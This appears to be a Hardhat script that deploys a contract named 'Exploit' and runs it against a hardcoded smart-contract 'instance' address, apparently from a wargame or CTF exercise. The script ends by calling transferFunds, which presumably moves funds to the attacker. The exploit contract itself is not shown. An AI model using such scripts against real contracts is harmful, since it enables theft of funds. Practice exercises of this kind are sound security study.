


const main = async () => {
    //deploy exploit contract
    const ExploitFactory = await hre.ethers.getContractFactory("Exploit");
    const exploitContract = await ExploitFactory.deploy()
    await exploitContract.deployed()
    console.log("exploit deployed at:", exploitContract.address)

    const instanceAddress = '0x636B97b94FE2383079a25d8b82b33b25Dc26F160'
    const attackerAddress = '0xa2bb722f87660C0F080A77ad2E830e830495162D'



    const firstTx = await exploitContract.firstDeploy(instanceAddress, attackerAddress)
    await firstTx.wait(2)
    console.log("1st tx hash:", firstTx.hash)


    const secondTx = await exploitContract.secondDeploy(instanceAddress,attackerAddress)
    await secondTx.wait(2)

    console.log("2nd tx hash:", secondTx.hash)
    await exploitContract.transferFunds()
    
}


main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
});